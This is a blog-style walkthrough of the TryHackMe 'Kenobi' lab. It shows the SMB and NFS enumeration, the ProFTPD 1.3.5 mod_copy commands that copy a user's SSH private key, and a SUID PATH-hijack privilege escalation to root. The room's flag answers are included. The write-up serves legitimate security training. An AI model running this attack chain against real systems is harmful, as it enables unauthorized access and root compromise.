<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="jb ">
<meta name="description" content="Simple Walkthrough for a TryHackMe Room" />
<meta name="keywords" content=", linux, pentest, smb, SUID, scanning, ftp, searchsploit, tryhackme, kenobi, walkthrough" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://xfafnir.com/posts/2023/04/thm_kenobi_walkthrough/" />


    <title>
        
            THM_Kenobi_Walkthrough :: jb 
        
    </title>





<link rel="stylesheet" href="https://xfafnir.com/main.b78c3be9451dc4ca61ca377f3dc2cf2e6345a44c2bae46216a322ef366daa399.css" integrity="sha256-t4w76UUdxMphyjd/PcLPLmNFpEwrrkYhajIu82bao5k=">



    <link rel="apple-touch-icon" sizes="180x180" href="https://xfafnir.com/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://xfafnir.com/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://xfafnir.com/favicon-16x16.png">
    <link rel="manifest" href="https://xfafnir.com/site.webmanifest">
    <link rel="mask-icon" href="https://xfafnir.com/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://xfafnir.com/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="THM_Kenobi_Walkthrough">
<meta itemprop="description" content="Simple Walkthrough for a TryHackMe Room"><meta itemprop="datePublished" content="2023-04-12T12:25:08-05:00" />
<meta itemprop="dateModified" content="2023-04-12T12:25:08-05:00" />
<meta itemprop="wordCount" content="656"><meta itemprop="image" content="https://xfafnir.com" />
<meta itemprop="keywords" content="linux,pentest,smb,SUID,scanning,ftp,searchsploit,tryhackme,kenobi,walkthrough," />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://xfafnir.com" /><meta name="twitter:title" content="THM_Kenobi_Walkthrough"/>
<meta name="twitter:description" content="Simple Walkthrough for a TryHackMe Room"/>



    <meta property="og:title" content="THM_Kenobi_Walkthrough" />
<meta property="og:description" content="Simple Walkthrough for a TryHackMe Room" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://xfafnir.com/posts/2023/04/thm_kenobi_walkthrough/" /><meta property="og:image" content="https://xfafnir.com" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-12T12:25:08-05:00" />
<meta property="article:modified_time" content="2023-04-12T12:25:08-05:00" />







    <meta property="article:published_time" content="2023-04-12 12:25:08 -0500 CDT" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://xfafnir.com/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                jb</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://xfafnir.com/about/">about</a></li><li><a href="https://xfafnir.com/posts/">posts</a></li><li><a href="https://xfafnir.com/tags/">tags</a></li><li><a href="https://xfafnir.com/contact/">contact</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        4 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://xfafnir.com/posts/2023/04/thm_kenobi_walkthrough/">THM_Kenobi_Walkthrough</a>
      </h1>

      
        <div class="post-excerpt">Simple Walkthrough for a TryHackMe Room</div>
      

      

      

      <div class="post-content">
        <h1 id="kenobi-thm">Kenobi THM</h1>
<h4 id="performed-by-jb-willams">performed by: jb-willams</h4>
<h1 id="heading"></h1>
<h2 id="deploy-the-vulnerable-machine">Deploy the vulnerable machine</h2>
<h1 id="heading-1"></h1>
<h3 id="scan-the-machine-with-nmap-how-many-ports-are-open"><em>Scan the machine with nmap, how many ports are open?</em></h3>
<ul>
<li>Deploy the Machine and scan it with nmap</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -p- -sV -sC -T4 -oA nmap/initial 10.10.223.56 <span style="color:#f92672">&amp;&amp;</span> grep -i <span style="color:#e6db74">&#34;open&#34;</span> nmap/initial.nmap | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span> | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f1 | tee nmap/ports.txt | wc -l
</span></span></code></pre></div><p><em>notice, you may get some false positives that will have <code>unknown service</code>, ignore them</em></p>
<ul>
<li><strong>Answer</strong>: Number of ports open: <code>7</code></li>
</ul>
<h1 id="heading-2"></h1>
<h2 id="enumerating-samba-for-shares">Enumerating Samba for shares</h2>
<h1 id="heading-3"></h1>
<h3 id="using-the-nmap-command-above-how-many-shares-have-been-found"><em>Using the nmap command above, how many shares have been found?</em></h3>
<ul>
<li>Using the previous nmap command I found:
They ask you to notice the SMB service running and mention that it would be a good idea to enumerate these shares with nmap scripts.</li>
<li>SMB uses ports <code>445</code> <code>139</code> (usually)</li>
<li>You can enumerate SMB with this nmap command using these scripts</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script<span style="color:#f92672">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.223.56
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>3</code></li>
</ul>
<h1 id="heading-4"></h1>
<h3 id="once-youre-connected-list-the-files-on-the-share-what-is-the-file-can-you-see"><em>Once you&rsquo;re connected, list the files on the share. What is the file can you see?</em></h3>
<ul>
<li>The scripts show an <code>anonymous</code> share.</li>
<li>Attempt to login to the share with <em>blank</em> password.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.223.56/anonymous
</span></span></code></pre></div><ul>
<li>To list the files run the <code>ls</code> cmd.</li>
<li>While logged in you can download that file running:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>get log.txt
</span></span></code></pre></div><ul>
<li>Or you can download recurisvely while not logged in with:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbget -R smb://10.10.223.56/anonymous
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>log.txt</code></li>
</ul>
<h1 id="heading-5"></h1>
<h3 id="what-port-is-ftp-runningon"><em>What port is FTP runningon</em>?</h3>
<ul>
<li>Reading the <code>log.txt</code> file the FTP service is running on:</li>
<li><strong>Answer</strong>: <code>21</code></li>
</ul>
<h1 id="heading-6"></h1>
<h3 id="what-mount-can-we-see"><em>What mount can we see?</em></h3>
<ul>
<li>Going back to our nmap scan for open ports we can see that there is RPC running on port 111(in this case) and we can enumerate that service more with nmap.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">111</span> --script<span style="color:#f92672">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.223.56
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>/var</code></li>
</ul>
<h1 id="heading-7"></h1>
<h2 id="gain-initial-access-with-proftpd">Gain initial access with ProFtpd</h2>
<h1 id="heading-8"></h1>
<h3 id="what-is-the-version"><em>What is the version?</em></h3>
<ul>
<li>With <code>netcat</code> you can do a quick connect to find the version of ProFTPD running.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.223.56 <span style="color:#ae81ff">21</span>
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>1.3.5</code></li>
</ul>
<h1 id="heading-9"></h1>
<h3 id="how-many-exploits-are-there-for-the-proftpd-running"><em>How many exploits are there for the ProFTPD running?</em></h3>
<ul>
<li>You can easily check for basice vulnerabilities with <code>searchsploit</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit proftpd 1.3.5
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>4</code></li>
</ul>
<h1 id="heading-10"></h1>
<h3 id="what-is-kenobis-user-flag-homekenobiusertxt"><em>What is Kenobi&rsquo;s user flag (/home/kenobi/user.txt)?</em></h3>
<ul>
<li>We see from searchsploit there is a <code>mod_copy</code> vulnerability ins ProFTPD.</li>
<li>And from <code>log.txt</code> we know there is an ssh key created for the <code>kenobi</code> user.</li>
<li>So, lets try to copy <code>kenobi</code>&rsquo;s ssh key to the mountable directory.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.223.56 <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD 1.3.5 Server <span style="color:#f92672">(</span>ProFTPD Default Installation<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.223.56<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>SITE CPFR /home/kenobi/.ssh/id_rsa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">350</span> File or directory exists, ready <span style="color:#66d9ef">for</span> destination name
</span></span><span style="display:flex;"><span>SITE CPTO /var/tmp/id_rsa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Copy successful
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><ul>
<li>Earlier, with the scan on port 111, we saw that there is a mount point at <code>/var</code> and we just moved the ssh key to that directory tree.</li>
<li>Lets mount the <code>/var</code> dir to our machine</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /mnt/kenobiNFS
</span></span><span style="display:flex;"><span>mount 10.10.223.56:/var /mnt/kenobiNFS
</span></span><span style="display:flex;"><span>ls -la /mnt/kenobiNFS
</span></span></code></pre></div><ul>
<li>And now we can traverse to <code>/mnt/kenobiNFS</code> and/or just copy it, and get kenobi&rsquo;s private key to login as that user.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /mnt/kenobiNFS/tmp/id_rsa .
</span></span><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">600</span> id_rsa
</span></span><span style="display:flex;"><span>ssh -i id_rsa kenobi@10.10.223.56
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: d0b0f3f53b6caa532a83915e19224899</li>
</ul>
<h1 id="heading-11"></h1>
<h2 id="privilege-escalation-with-path-variable-manipulation">Privilege Escalation with Path Variable Manipulation</h2>
<h1 id="heading-12"></h1>
<h3 id="what-file-looks-particularly-out-of-the-ordinary"><em>What file looks particularly out of the ordinary?</em></h3>
<ul>
<li>They let you know some info about SUID&rsquo;s and that they can be used to escalate priveleges.</li>
<li>Using their command try to find the file that looks out of the ordinary. (I have used my own machine as reference several times)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>/usr/bin/menu</code></li>
</ul>
<h1 id="heading-13"></h1>
<h3 id="run-the-binary-how-many-options-appear"><em>Run the binary, how many options appear?</em></h3>
<ul>
<li><strong>Answer</strong>: <code>3</code></li>
</ul>
<h1 id="heading-14"></h1>
<h3 id="what-is-the-root-flag-rootroottxt"><em>What is the root flag (/root/root.txt)?</em></h3>
<ul>
<li>
<p>Looking at the binary <code>ls -la /usr/bin/menu</code> shows that it is owned by <code>root</code> and could run with root priveleges.</p>
</li>
<li>
<p>Running <code>strings /usr/bin/menu</code> shows that the commands are not being ran using the absolute path, so we may be able to exploit this.</p>
</li>
<li>
<p>We are going copy <code>/bin/bash</code> to <code>/tmp/curl</code> then modify the <code>$PATH</code> to read our binary first.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo /bin/bash &gt; /tmp/curl
</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/curl
</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
</span></span></code></pre></div><ul>
<li>
<p>Then run <code>/usr/bin/menu</code> again and chose option <code>1</code> that uses curl and it will place you in a priveleged bash shell.</p>
</li>
<li>
<p><strong>Answer</strong>: <code>177b3cd8562289f37382721c28381f02</code></p>
</li>
</ul>
<h1 id="heading-15"></h1>
<h1 id="heading-16"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://xfafnir.com/tags/linux/">linux</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/pentest/">pentest</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/smb/">smb</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/suid/">SUID</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/scanning/">scanning</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/ftp/">ftp</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/searchsploit/">searchsploit</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/tryhackme/">tryhackme</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/kenobi/">kenobi</a></span>
        <span class="tag"><a href="https://xfafnir.com/tags/walkthrough/">walkthrough</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        656 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2023-04-12 12:25
        

         
          
        
      </p>
    </div>

    
    <div class="pagination">
        

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://xfafnir.com/posts/2023/04/thm_picklerick_walkthrough/">
                    <span class="button__icon">←</span>
                    <span class="button__text">THM_PickleRick_Walkthrough</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="https://xfafnir.com/posts/2023/04/thm_vulnversity_walkthrough/">
                    <span class="button__text">THM_Vulnversity_Walkthrough</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="https://xfafnir.com">jb</a></span>
            <span>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</span>
            <span><a href="https://xfafnir.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by jb-williams</span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://xfafnir.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>



    </body>
</html>
